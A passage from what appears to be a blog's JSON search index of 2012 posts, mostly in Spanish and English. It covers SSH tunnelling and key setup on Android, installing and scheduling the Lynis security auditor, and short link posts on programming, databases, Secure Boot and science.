| lifehacker.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/07/24/does-bitrate-really-make-a-difference-in-my-music/","loc":"https://karpoke.ignaciocano.com/2012/07/24/does-bitrate-really-make-a-difference-in-my-music/"},{"title":"Conectar de forma segura en redes abiertas con Android, ConnectBot y ProxyDroid","text":"Si necesitamos conectarnos desde nuestro terminal con Android a una red WiFi que no es segura, ya sea porque es una red abierta o porque no es de confianza, podemos utilizar ConnectBot para crear un túnel SSH para encauzar todas las conexiones que realicemos desde el terminal a través de él. Para esto necesitaremos: Acceso a un servidor SSH Un cliente SSH para Android, por ejemplo ConnectBot Un cliente proxy para Android, por ejemplo ProxyDroid ProxyDroid es una aplicación que permite crear un proxy transparente en terminales Android. Si queremos que todas las conexiones vayan a través del proxy de forma transparente, es decir, sin tener que configurar nada más en el terminal ni en las aplicaciones, necesitaremos que el terminal esté rooteado . El primer paso será conectarnos con ConnectBot al servidor SSH mediante claves , para evitar tener que estar introduciendo contraseñas, de tal manera que con añadir un widget la conexión se realizará con una sólo pulsación. Para crear la redirección de puertos en ConnectBot, realizamos una pulsación larga sobre la conexión a utilizar, que ya debemos tener configurada previamente, y seleccionamos Editar redirección de puertos. Pulsamos en Menú > Añadir redirección de puertos y utilizamos los siguientes datos: Nombre: el nombre que le damos a esta redirección de puertos (puede ser cualquiera) Tipo: Dinámico (SOCKS) Puerto fuente: 3128 (es el que utiliza ProxyDroid por defecto) Destino: no es relevante En ProxyDroid, deberemos utilizar los siguientes datos: Host: localhost Puerto: 3128 Proxy Type: SOCKS5 Global Proxy: Lo marcamos para que todas las peticiones vayan por el proxy . Necesitaremos que el teléfono esté rooteado Añadimos un widget para facilitar la activación del proxy . De esta forma, para conectarnos a una red WiFi insegura: activamos el proxy antes de conectarnos nos conectamos a la red WiFi creamos el túnel SSH conectándonos al servidor remoto Si la red WiFi tiene un portal cautivo, deberemos conectarnos antes de activar el proxy y acceder mediante el navegador para introducir la contraseña o aceptar las condiciones del servicio, ya que de lo contrario no podremos conectarnos al servidor SSH (a no ser que encontremos una manera de saltarnos dicho portal cautivo ). Referencias » ConnectBot en el market » ProxyDroid en el market","tags":"admin","url":"https://karpoke.ignaciocano.com/2012/07/24/conectar-de-forma-segura-en-redes-abiertas-con-android-connectbot-y-proxydroid/","loc":"https://karpoke.ignaciocano.com/2012/07/24/conectar-de-forma-segura-en-redes-abiertas-con-android-connectbot-y-proxydroid/"},{"title":"Conectar a un servidor SSH desde Android mediante ConnectBot utilizando claves","text":"ConnectBot es, en mi humilde opinión, el mejor cliente SSH para Android. Nos permite conectarnos de forma segura a nuestro servidor SSH, ya sea directamente o mediante la creación de un túnel SSH que sirva de proxy al resto de aplicaciones. La manera más segura de conectarnos es mediante la utilización de claves. Este es un sistema de autenticación basado en criptografía asimétrica, más seguro que utilizar simples contraseñas. ConnectBot no sólo permite utilizar claves, sino que también nos permite crearlas e importarlas. Para poder conectarnos a nuestro servidor sin necesidad de utilizar contraseñas, lo primero será que éste esté configurado para aceptar claves . En particular, en el fichero /etc/ssh/sshd_config , debemos tener la directiva: bash PubkeyAuthentication yes Si queremos importar una clave para ser utilizada por ConnectBot, lo único que tendremos que hacer es guardarla en la raíz de la tarjeta de memoria e ir a Menú > Administrar claves públicas > Menú > Importar. Otra opción es generar un par de claves. Para ello, vamos a Menú > Administrar claves públicas > Menú > Generar, y utilizamos los siguientes datos: Nombre para la clave: keyname (podemos usar el nombre que queramos para poder identificarla) Tipo: RSA Bits: 4096 Contraseña: si queremos, podemos optar por dejarla en blanco, sabiendo que si la clave cae en malas manos puede tener una puerta abierta hacia nuestro servidor. Cargar al inicio: lo marcamos si queremos que la clave se cargue en memoria nada más arrancar el teléfono. Si la clave no está cargada en memoria, ConnectBot no intentará utilizarla. Confirmar antes de cargar: lo marcamos si queremos que nos pida confirmación cuando se vaya a utilizar la clave. El siguiente paso es copiar la clave pública al listado de claves autorizadas para el usuario en el servidor. La forma más rápida y sencilla y es ir al gestor de claves y copiamos la clave pública de la clave en cuestión (realizando una pulsación larga sobre la misma). Luego, nos conectamos al servidor normalmente, mediante usuario y contraseña, y añadimos la clave mediante el siguiente comando (aquí pegamos la clave pública que habíamos copiado): bash username@remote:~$ echo \"ssh-rsa AAAA.....(resto de la clave)\" >> .ssh/authorized_keys La próxima vez que nos conectemos mediante ConnectBot ya no necesitaremos utilizar usuario ni contraseña. Si no hemos seleccionado cargar la clave al inicio, y la clave no está cargada en memoria en el momento de hacer el intento de conexión, ConnectBot nos pedirá que nos autentiquemos mediante usuario y contraseña. Si hemos marcado que nos avise antes de usar la clave, y la clave está cargada en memoria, nos pedirá confirmación antes de usarla. Denegar el acceso Si, por cualquier motivo, queremos denegar el acceso a dicha clave al servidor, lo único que tenemos que hacer es borrarla del fichero ~/.ssh/authorized_keys . Una sencilla forma de hacerlo es mediante el nombre que hemos utilizado para la clave: bash username@remote:~$ sed -i '/keyname$/d' ~/.ssh/authorized_keys Referencias » ConnectBot en el market","tags":"admin","url":"https://karpoke.ignaciocano.com/2012/07/24/conectar-a-un-servidor-ssh-desde-android-mediante-connectbot-utilizando-claves/","loc":"https://karpoke.ignaciocano.com/2012/07/24/conectar-a-un-servidor-ssh-desde-android-mediante-connectbot-utilizando-claves/"},{"title":"History of the browser user-agent string","text":"In the beginning there was NCSA Mosaic, and Mosaic called itself NCSA_Mosaic/2.0 (Windows 3.1), and Mosaic displayed pictures along with text, and there was much rejoicing. And behold, then came a new web browser known as \"Mozilla\", being short for \"Mosaic Killer,\" but Mosaic was not amused, so the public name was changed to Netscape, and Netscape called itself Mozilla/1.0 (Win3.1), and there was more rejoicing. And Netscape supported frames, and frames became popular among the people, but Mosaic did not support frames, and so came \"user agent sniffing\" and to \"Mozilla\" webmasters sent frames, but to other browsers they sent not frames. Aaron Andersen | webaim.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/07/17/history-of-the-browser-user-agent-string/","loc":"https://karpoke.ignaciocano.com/2012/07/17/history-of-the-browser-user-agent-string/"},{"title":"A Turing Complete Puzzle Game","text":"The code behind the Google doodle celebrating Alan Turing's 100th birthday is now up on Google code. This animated logic puzzle game appeared on the Google homepage on June 23, 2012. If you missed it, you can still play it in the doodle archives. Our doodle for Turing's 100th birthday showed a live action Turing Machine with twelve interactive programming puzzles. Turing Machines are theoretical objects in formal logic, not physical things, so we walked a fine line between technical accuracy and accessibility. We focused on finding a good representation for programs and choosing puzzles of appropriate complexity. We did considerable user testing and iteration, more than for any past doodle. Jered Wierzbicki and Corrie Scalisi google-opensource.blogspot.com.es","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/07/17/a-turing-complete-puzzle-game/","loc":"https://karpoke.ignaciocano.com/2012/07/17/a-turing-complete-puzzle-game/"},{"title":"Un largo segundo en el cerebro","text":"Millones de impulsos llegan al cerebro desde distintos sentidos. Millones llegan incluso desde un sentido como la vista. El cerebro tiene múltiples áreas de procesamiento. En la vista por ejemplo se procesa en centros distintos el color, la forma o el movimiento. Cada impulso recorre un camino diferente al resto. Algunos son más largos y otros son más cortos. Por lo tanto, tardan distinto tiempo en llegar al cerebro. ¿Cómo sabe el cerebro que dos impulsos que sucedieron a la vez pero llegan en distinto momento son en realidad simultáneos? El cerebro no es una cámara fotográfica. El cerebro construye el mundo, no toma una imagen fija. El ejemplo de la vista es claro. Vemos un auto rojo moverse. No vemos una sucesión de manchas rojas y una sucesión de formas de auto en distintas posiciones. Es lo que se llama la unión de características. El cerebro lo integra todo y vemos un auto rojo moverse. Antonio Orbe | alt1040.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/07/16/un-largo-segundo-en-el-cerebro/","loc":"https://karpoke.ignaciocano.com/2012/07/16/un-largo-segundo-en-el-cerebro/"},{"title":"MySQL, MSSQL and Oracle SQL Injection Compilation","text":"This Knowledge Base was put together and is maintained by Roberto Salgado, Co-Founder of Websec. It is a compilation of books, papers, cheatsheets and testing done by Roberto over the years. Roberto Salgado | websec.ca","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/07/15/mysql-mssql-and-oracle-sql-injection-compilation/","loc":"https://karpoke.ignaciocano.com/2012/07/15/mysql-mssql-and-oracle-sql-injection-compilation/"},{"title":"A Visual Git Reference","text":"This page gives brief, visual reference for the most common commands in git. Once you know a bit about how git works, this site may solidify your understanding. Mark Lodato | marklodato.github.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/07/15/a-visual-git-reference/","loc":"https://karpoke.ignaciocano.com/2012/07/15/a-visual-git-reference/"},{"title":"Levels of aspiration","text":"Debates over technology, technique, and process often go nowhere because the participants are arguing from different levels of aspiration. You're unlikely to convince someone they should switch to programming Ruby for its beauty, if they're merely looking to make a living as a single consultant serving local businesses in Schaumburg, Illinois. Questions such as \"does this run on my existing web host?\" or \"will my clients want something their nephew web designer hasn't even heard of?\" matter far more. Their aspirations are local, finding something that (sorta) works, and getting paid. David | 37signals.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/07/15/levels-of-aspiration/","loc":"https://karpoke.ignaciocano.com/2012/07/15/levels-of-aspiration/"},{"title":"¿Existen los colores en la naturaleza?","text":"Aparentemente esta pregunta parece absurda, ¿Como no van a existir los bellos colores de los paisajes que podemos observar a diario? El azul del cielo, el verde de las hojas de los árboles... parece evidente que los colores existen y son uno de los atributos más fundamentales de todos los objetos que observamos. Sin embargo, como veremos a continuación la respuesta a esta pregunta es asombrosa e inesperada. Lo primero que tenemos que hacer para tratar de responderla es analizar brevemente como y por que vemos los objetos que nos rodean. » revolucioncientifica.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/07/15/existen-los-colores-en-la-naturaleza/","loc":"https://karpoke.ignaciocano.com/2012/07/15/existen-los-colores-en-la-naturaleza/"},{"title":"Statistical functions in MySQL","text":"Even in times of a growing market of specialized NoSQL databases, the relevance of traditional RDBMS doesn't decline. Especially when it comes to the calculation of aggregates based on complex data sets that can not be processed as a batch like Map&Reduce. MySQL is already bringing in a handful of aggregate functions that can be useful for a statistical analysis. The best known of this type are certainly: bash COUNT(x), SUM(x), AVG(x), MIN(x), MAX(x), STD(x) In addition, there are a number of statistical evaluations which are also worthwhile - if not even more interesting and meaningful, but with MySQL only producible with greater efforts. What about the different averages? The harmonic average, a weighted average or the geomean? What is in the course of this with the aggregate product? How do we determine the mode, the median? The covariance? In the following article I want to go to the bottom of these questions and develop a list of standard formulas for a statistical evaluation. Presumably the article is meant more for beginners. In addition, a few new features have been poured into my infusion UDF, which simplifies some of the calculations. You can check out the source of the UDF on Github: Robert Eisele | xarg.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/07/14/statistical-functions-in-mysql/","loc":"https://karpoke.ignaciocano.com/2012/07/14/statistical-functions-in-mysql/"},{"title":"Ready-to-use virtual machines sporting open-source operating systems","text":"We provide pre-built images for several open-source operating systems. Please note that: Every image contains the latest software as of the day the image was built. Performing updates is on your own, and may require looking for documentation to read using your favourite search engine. Default usernames and passwords, where required, can be found next to the download link of each image. You are warmly invited to create your own user, or at least to change passwords, if you intend to use the images in a public environment. » virtualboxes.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/07/14/ready-to-use-virtual-machines-sporting-open-source-operating-systems/","loc":"https://karpoke.ignaciocano.com/2012/07/14/ready-to-use-virtual-machines-sporting-open-source-operating-systems/"},{"title":"Lynis para auditorías de seguridad","text":"Lynis es una herramienta para realizar auditorías en sistemas Unix. Escanea el sistema en busca de vulnerabilidades y fallos de seguridad. También muestra información general del sistema, paquetes instalados y errores de configuración. Su objetivo es ayudar en el proceso de auditoría, actualización del software y escaneo de vulnerabilidades y malware en sistemas Unix. Se puede ejecutar sin necesidad de instalación. Se puede utilizar en auditorías Basel II, GLBA, HIPAA, PCI DSS y SOX (Sabarnes-Oxley). La documentación está disponible en línea. Si queremos probarlo, no tenemos más que descargarlo de su página, ahora mismo la última versión estable es la 1.3.0, descomprimirlo y ejecutarlo: bash $ wget http://www.rootkit.nl/files/lynis-1.3.0.tar.gz $ shasum lynis-1.3.0.tar.gz b60921420277a969cf862b0e0166fe36451057b9 lynis-1.3.0.tar.gz $ tar xvzf lynis-1.3.0.tar.gz $ cd lynis-1.3.0 Algunas opciones: ```bash Scan options: --auditor \"\" : Auditor name --check-all (-c) : Check system --no-log : Don't create a log file --profile : Scan the system with the given profile file --quick (-Q) : Quick mode, don't wait for user input --tests \"\" : Run only tests defined by --tests-category \"\" : Run only tests defined by Layout options: --no-colors : Don't use colors in output --quiet (-q) : No output, except warnings --reverse-colors : Optimize color display for light backgrounds Misc options: --check-update : Check for updates --view-manpage (--man) : View man page --version (-V) : Display version number and quit ``` Por ejemplo: bash $ sudo ./lynis -Q Si queremos que realice un reporte automático, por ejemplo diario, podemos incluir una línea como la siguiente en el cron : bash $ sudo crontab -e 23 7 * * * /path/to/lynis-1.3.0/lynis --auditor \"automated\" --cronjob El argumento --cronjob equivale a -c -Q , es decir, todos los tests y sin intervención del usuario. O crear el fichero /etc/cron.daily/lynis con el siguiente contenido: ```bash !/bin/sh LYNIS=/path/to/lynis-1.3.0/lynis NICE=0 MAILTO=\"root@localhost\" test -x $LYNIS || exit 0 OUTFILE= mktemp || exit 1 cd \\((dirname $LYNIS) /usr/bin/nice -n $NICE $LYNIS --cronjob --auditor \"automated\" > $OUTFILE if [ -s \"\\) OUTFILE\" ]; then SUBJECT=\"Subject: lynis $(hostname -f) - Daily report\" cat $OUTFILE | mail -s $SUBJECT $MAILTO fi rm -f $OUTFILE ``` Actualizado el 3 de diciembre de 2016 La forma más sencilla de mantener lynis actualizado es utilizar el repositorio oficial y seguir lo siguientes pasos. Si lo habíamos instalado desde los repositorios de Ubuntu, lo desinstalamos: bash $ sudo apt remove lynis Descargamos la clave desde el servidor central de claves de Ubuntu: bash $ sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys C80E383C3DE9F082E01391A0366C67DE91CA5D5F En su defecto, también podríamos descargarla e importarla del servidor oficial de la aplicación: bash $ wget -O - http://packages.cisofy.com/keys/cisofy-software-public.key | sudo apt-key add - Añadimos el repostorio: bash $ echo \"deb https://packages.cisofy.com/community/lynis/deb/ trusty main\" | sudo tee -a /etc/apt/sources.list.d/cisofy-lynis.list Actualizamos los paquetes y reinstalamos: bash $ sudo apt update $ sudo apt install lynis if (!document.getElementById('mathjaxscript_pelican_#%@#$@#')) { var align = \"center\", indent = \"0em\", linebreak = \"false\"; if (false) { align = (screen.width < 768) ? \"left\" : align; indent = (screen.width < 768) ? \"0em\" : indent; linebreak = (screen.width < 768) ? 'true' : linebreak; } var mathjaxscript = document.createElement('script'); mathjaxscript.id = 'mathjaxscript_pelican_#%@#$@#'; mathjaxscript.type = 'text/javascript'; mathjaxscript.src = 'https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.3/latest.js?config=TeX-AMS-MML_HTMLorMML'; var configscript = document.createElement('script'); configscript.type = 'text/x-mathjax-config'; configscript[(window.opera ? \"innerHTML\" : \"text\")] = \"MathJax.Hub.Config({\" + \" config: ['MMLorHTML.js'],\" + \" TeX: { extensions: ['AMSmath.js','AMSsymbols.js','noErrors.js','noUndefined.js'], equationNumbers: { autoNumber: 'none' } },\" + \" jax: ['input/TeX','input/MathML','output/HTML-CSS'],\" + \" extensions: ['tex2jax.js','mml2jax.js','MathMenu.js','MathZoom.js'],\" + \" displayAlign: '\"+ align +\"',\" + \" displayIndent: '\"+ indent +\"',\" + \" showMathMenu: true,\" + \" messageStyle: 'normal',\" + \" tex2jax: { \" + \" inlineMath: [ ['\\\\\\\\(','\\\\\\\\)'] ], \" + \" displayMath: [ ['$$','$$'] ],\" + \" processEscapes: true,\" + \" preview: 'TeX',\" + \" }, \" + \" 'HTML-CSS': { \" + \" availableFonts: ['STIX', 'TeX'],\" + \" preferredFont: 'STIX',\" + \" styles: { '.MathJax_Display, .MathJax .mo, .MathJax .mi, .MathJax .mn': {color: 'inherit ! important'} },\" + \" linebreaks: { automatic: \"+ linebreak +\", width: '90% container' },\" + \" }, \" + \"}); \" + \"if ('default' !== 'default') {\" + \"MathJax.Hub.Register.StartupHook('HTML-CSS Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax['HTML-CSS'].FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"MathJax.Hub.Register.StartupHook('SVG Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax.SVG.FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"}\"; (document.body || document.getElementsByTagName('head')[0]).appendChild(configscript); (document.body || document.getElementsByTagName('head')[0]).appendChild(mathjaxscript); }","tags":"admin","url":"https://karpoke.ignaciocano.com/2012/07/14/lynis-para-auditorias-de-seguridad/","loc":"https://karpoke.ignaciocano.com/2012/07/14/lynis-para-auditorias-de-seguridad/"},{"title":"Cómo medir la eficiencia energética de tu propio coche","text":"Pere Roura (Universitat de Girona) y Daniel Oliu nos cuentan en \"How energy efficient is your car?,\" AJP 80: 588-593, July 2012, cómo medir de forma práctica la eficiencia energética de tu propio coche. Como ejemplo utilizan su Volkswagen Lupo 3L, un coche diseñado para ser muy eficiente con un motor diésel de tres cilindros, un peso de 830 kg y un consumo récord de solo 3 litros a los 100 km. Según su estudio solo el 28% de la energía del combustible se transfiere a las ruedas, lo que sin lugar a dudas es todo un récord en eficiencia para un vehículo comercial. Sin embargo, también nos recuerda que el 72% de la energía del combustible se pierde por aerodinámica, fricción, pérdidas mecánicas y térmicas. En los vehículos de gasolina, la eficiencia suele ser mucho menor. Para un vehículo típico se estima que solo el 12-13% de la energía del combustible se transmite a las ruedas, según el estudio de Joseph A. Carpenter, Jr. (Department of Energy, USA) et al., \"Road Transportation Vehicles,\" MRS Bull. 33: 439–444, 2008 [copia gratis], del que he extraído la figura de abajo. Roura y Oliu nos proponen experimentos sencillos que los estudiantes de grado en ingeniería industrial, mecánica y otras titulaciones similares pueden ejecutar solo con conocimiento básicos de mecánica (resistencia del aire y a la rodadura) y termodinámica (ciclos térmicos). No traduciré todo su artículo, solo presentaré un breve resumen con las figuras clave, para que veáis cómo se realizan los experimentos y cómo se obtienen los resultados. Animo a los interesados en más detalles que consulten el artículo en la revista (American Journal of Physics), si tienen acceso, o que le pidan por correo electrónico una copia a Pepe Roura (que seguro que estará encantado por el interés despertado por su artículo). » francisthemulenews.wordpress.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/07/14/como-medir-la-eficiencia-energetica-de-tu-propio-coche/","loc":"https://karpoke.ignaciocano.com/2012/07/14/como-medir-la-eficiencia-energetica-de-tu-propio-coche/"},{"title":"Preliminary discussion of the logical design of an electronic computing instrument","text":"Arthur W. Burks / Herman H. Goldstine / John von Neumann PART I ​1. Principal components of the machine 1.1. Inasmuch as the completed device will be a general-purpose computing machine it should contain certain main organs relating to arithmetic, memory-storage, control and connection with the human operator. It is intended that the machine be fully automatic in character, i.e. independent of the human operator after the computation starts. A fuller discussion of the implications of this remark will be given in Sec. 3 below. 1.2. It is evident that the machine must be capable of storing in some manner not only the digital information needed in a given computation such as boundary values, tables of functions (such as the equation of state of a fluid) and also the intermediate results of the computation (which may be wanted for varying lengths of time), but also the instructions which govern the actual routine to be performed on the numerical data. In a special-purpose machine these instructions are an integral part of the device and constitute a part of its design structure. For an all-purpose machine it must be possible to instruct the device to carry out any computation that can be formulated in numerical terms. Hence there must be some organ capable of storing these program orders. There must, moreover, be a unit which can understand these instructions and order their execution. » cs.unc.edu/\\~adyilie","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/07/13/preliminary-discussion-of-the-logical-design-of-an-electronic-computing-instrument/","loc":"https://karpoke.ignaciocano.com/2012/07/13/preliminary-discussion-of-the-logical-design-of-an-electronic-computing-instrument/"},{"title":"Scaling lessons learned at Dropbox","text":"I was in charge of scaling Dropbox for a while, from roughly 4,000 to 40,000,000 users. For most of that time we had one to three people working on the backend. Here are some suggestions on scaling, particularly in a resource-constrained, fast-growing environment that can't always afford to do things \"the right way\" (i.e., any real-world engineering project ;-). If people find this useful, I'll try to come up with more tips and write a part 2. Rajiv Eranki | eranki.tumblr.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/07/13/scaling-lessons-learned-at-dropbox/","loc":"https://karpoke.ignaciocano.com/2012/07/13/scaling-lessons-learned-at-dropbox/"},{"title":"The Complete Wildfire Index (Root/S-OFF Guides/ROMs/Kernels/Radios/RUU/Recoveries/Themes)","text":"This thread has 2 Posts, and is categorized as following. You can scroll down to the Point you are looking for. Post 1: Getting Root / S-OFF to your Wildfire. A Short overview and Guide Custom ROM List Post 2: Custom Kernels List Radio (Baseband) List RUU List (ROM Update Utility - Getting back to stock) Custom Recoveries (ClockWorkMod) Themes List Misc tweaks / hacks 3xeno | xda-developers.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/07/13/the-complete-wildfire-index-roots-off-guidesromskernelsradiosruurecoveriesthemes/","loc":"https://karpoke.ignaciocano.com/2012/07/13/the-complete-wildfire-index-roots-off-guidesromskernelsradiosruurecoveriesthemes/"},{"title":"ROM NaRkDrOiD IcX3 (4.0.3 LP8/LP9) para Samsung Galaxy S2","text":"[ROM] [UPDATE1] [{\\&#94;NaRkDrOiD IcX3\\&#94;}][4.0.3. LP8/LP9][MejorasVarias][Mods][Extras][Novedades y mucho más!] [ ¿¿TE LO VAS A PERDER?? ] anarko919 | htcmania.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/07/13/rom-narkdroid-icx3-4-0-3-lp8lp9-para-samsung-galaxy-s2/","loc":"https://karpoke.ignaciocano.com/2012/07/13/rom-narkdroid-icx3-4-0-3-lp8lp9-para-samsung-galaxy-s2/"},{"title":"Key Principles of Maintainable JavaScript","text":"The thing to remember, above all else when writing JS code, is that it's a dynamic language. This means there are a lot of ways to do things. You don't have to deal with strongly typed classes, or some of the more complex features from languages, like C# and Java. This is both a blessing and a curse. You can read an article on the history of JavaScript here, but the gist of it is that Brandon Eich, in 1995, was hired by Netscape to design a language. What he came up with was the loosely typed language that we know as JavaScript. Over the years, it became \"standardized\" as ECMAscript, but, throughout all the browser wars, the various browsers implemented these features differently. This, naturally, lead to a lot of sleepless nights for web developers. This problem, when combined with the fact that JavaScript was considered to be most applicable for manipulating images and performing quick bits of validation, led JavaScript to, incorrectly, be viewed as a terrible language. Jonathan Creamer | net.tutsplus.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/07/11/key-principles-of-maintainable-javascript/","loc":"https://karpoke.ignaciocano.com/2012/07/11/key-principles-of-maintainable-javascript/"},{"title":"Caching with Twemcache","text":"We built Twemcache because we needed a more robust and manageable version of Memcached, suitable for our large-scale production environment. Today, we are open-sourcing Twemcache under the New BSD license. As one of the largest adopters of Memcached, a popular open source caching system, we have used Memcached over the years to help us scale our ever-growing traffic. Today, we have hundreds of dedicated cache servers keeping over 20TB of data from over 30 services in-memory, including crucial data such as user information and Tweets. Collectively these servers handle almost 2 trillion queries on any given day (that's more than 23 million queries per second). As we continued to grow, we needed a more robust and manageable version of Memcached suitable for our large scale production environment. We have been running Twemcache in production for more than a year and a half. Twemcache is based on a fork of Memcached v1.4.4 that is heavily modified to improve maintainability and help us monitor our cache servers better. We improved performance, removed code that we didn't find necessary, refactored large source files and added observability related features. The following sections will provide more details on why we did this and what those new features are. Chris Aniszczyk | engineering.twitter.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/07/11/caching-with-twemcache/","loc":"https://karpoke.ignaciocano.com/2012/07/11/caching-with-twemcache/"},{"title":"The TTY demystified","text":"The TTY subsystem is central to the design of Linux, and UNIX in general. Unfortunately, its importance is often overlooked, and it is difficult to find good introductory articles about it. I believe that a basic understanding of TTYs in Linux is essential for the developer and the advanced user. Beware, though: What you are about to see is not particularly elegant. In fact, the TTY subsystem \" while quite functional from a user's point of view \" is a twisty little mess of special cases. To understand how this came to be, we have to go back in time. Linus …kesson | linusakesson.net","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/07/09/the-tty-demystified/","loc":"https://karpoke.ignaciocano.com/2012/07/09/the-tty-demystified/"},{"title":"Pitfalls in Random Number Generation","text":"Random number generation is subtle. Random number generators contain deterministic algorithms designed to produce output that simulates non-deterministic behavior. It's amazing that there are algorithms that do this well enough for many applications. But unless used carefully, random number generators can misbehave in mysterious ways. John D. Cook | codeproject.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/07/09/pitfalls-in-random-number-generation/","loc":"https://karpoke.ignaciocano.com/2012/07/09/pitfalls-in-random-number-generation/"},{"title":"La vida, ¿es inevitable o un simple acontecimiento fortuito?","text":"Bajo la intensa mirada del telescopio espacial Kepler, van apareciendo ante nosotros más y más planetas similares al nuestro. Todavía no hemos encontrado uno exactamente igual que la Tierra, pero son tantos los descubiertos que parece que la galaxia debe estar llena de planetas habitables. Estos descubrimientos nos traen de nuevo una vieja paradoja. Tal como el físico Enrico Fermi, preguntó en 1950, si hay muchas sitios adecuados para la vida ahí fuera y las formas de vida extraterrestre pueden ser comunes, ¿dónde se han metido? Después de más de medio siglo de búsqueda de inteligencia extraterrestre, hasta el momento nos quedamos con las manos vacías. Por supuesto, el universo es un lugar muy grande. Incluso la famosa y optimista \"ecuación\" de Frank Drake sobre la probabilidad de vida sugiere que, si tenemos suerte, nos toparemos con alienígenas inteligentes: ellos pueden estar ahí fuera, pero eso nunca lo sabremos. No obstante, esa respuesta no satisface a nadie. Pedro Donaire | bitnavegante.blogspot.com.es","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/07/07/la-vida-es-inevitable-o-un-simple-acontecimiento-fortuito/","loc":"https://karpoke.ignaciocano.com/2012/07/07/la-vida-es-inevitable-o-un-simple-acontecimiento-fortuito/"},{"title":"Definitive PHP security checklist","text":"There was a recent question about a PHP security checklist on a forum I frequent, and I've decided to write my own comprehensive checklist to fill the void. There's something for everyone but the security expert. In fact, you might find an issue that you never thought about. Securing PHP web applications would be a better title for this article. » sk89q.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/07/06/definitive-php-security-checklist/","loc":"https://karpoke.ignaciocano.com/2012/07/06/definitive-php-security-checklist/"},{"title":"Free Software Foundation recommendations for free operating system distributions considering Secure Boot","text":"We have been working hard the last several months to stop Restricted Boot, a major threat to user freedom, free software ideals, and free software adoption. Under the guise of security, a computer afflicted with Restricted Boot refuses to boot any operating systems other than the ones the computer distributor has approved in advance. Restricted Boot takes control of the computer away from the user and puts it in the hands of someone else. To respect user freedom and truly protect user security, computer makers must either provide users a way of disabling such boot restrictions, or provide a sure-fire way that allows the computer user to install a free software operating system of her choice. Distributors of restricted systems usually appeal to security concerns. They claim that if unapproved software can be used on the machines they sell, malware will run amok. By only allowing software they approve to run, they can protect us. This claim ignores the fact that we need protection from them. We don't want a machine that only runs software approved by them -- our computers should always run only software approved by us. We may choose to trust someone else to help us make those approval decisions, but we should never be locked into that relationship by force of technological restriction or law. Software that enforces such restrictions is malware. Companies like Microsoft that push these restrictions also have a terrible track record when it comes to security, which makes their platitudes about restricting us for our own good both hollow and deceitful. » fsf.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/07/06/free-software-foundation-recommendations-for-free-operating-system-distributions-considering-secure-boot/","loc":"https://karpoke.ignaciocano.com/2012/07/06/free-software-foundation-recommendations-for-free-operating-system-distributions-considering-secure-boot/"},{"title":"Declaration of Internet freedom","text":"We believe that a free and open Internet can bring about a better world. To keep the Internet free and open, we call on communities, industries and countries to recognize these principles. We believe that they will help to bring about more creativity, more innovation and more open societies. We are joining an international movement to defend our freedoms because we believe that they are worth fighting for. Let's discuss these principles \" agree or disagree with them, debate them, translate them, make them your own and broaden the discussion with your community \" as only the Internet can make possible. Join us in keeping the Internet free and open. [You can interact with the following text on reddit, Techdirt, Cheezburger, Github and Rhizome.] Declaration We stand for a free and open Internet. We support transparent and participatory processes for making Internet policy and the establishment of five basic principles: Expression: Don't censor the Internet. Access: Promote universal access to fast and affordable networks. Openness: Keep the Internet an open network where everyone is free to connect, communicate, write, read, watch, speak, listen, learn, create and innovate. Innovation: Protect the freedom to innovate and create without permission. Don't block new technologies, and don't punish innovators for their users' actions. Privacy: Protect privacy and defend everyone's ability to control how their data and devices are used. » internetdeclaration.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/07/05/declaration-of-internet-freedom/","loc":"https://karpoke.ignaciocano.com/2012/07/05/declaration-of-internet-freedom/"},{"title":"Radix Sort Revisited","text":"In every decent programmer's toolbox lies a strange weapon called a Radix Sort. Where does it come from ? Who invented it ? I don't know. As far as I can remember it was there, fast, easy, effective. Really effective. So unbelievably useful I've never really understood why people would want to use something else. The reasons ? Most of the time, they tell me about floats, negative values, and why their new quick-sort code rocks. Enough, I'm tired. Although the standard Radix Sort doesn't work very well with floating point values, this is something actually very easy to fix. In this little article I will review the standard Radix Sort algorithm, and enhance it so that : it sorts negative floats as well it has reduced complexity for bytes and words it uses temporal coherence it supports sorting on multiple keys Pierre Terdiman | codercorner.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/07/05/radix-sort-revisited/","loc":"https://karpoke.ignaciocano.com/2012/07/05/radix-sort-revisited/"},{"title":"A Gentle Introduction to Algorithm Complexity Analysis","text":"A lot of programmers that make some of the coolest and most useful software today, such as many of the 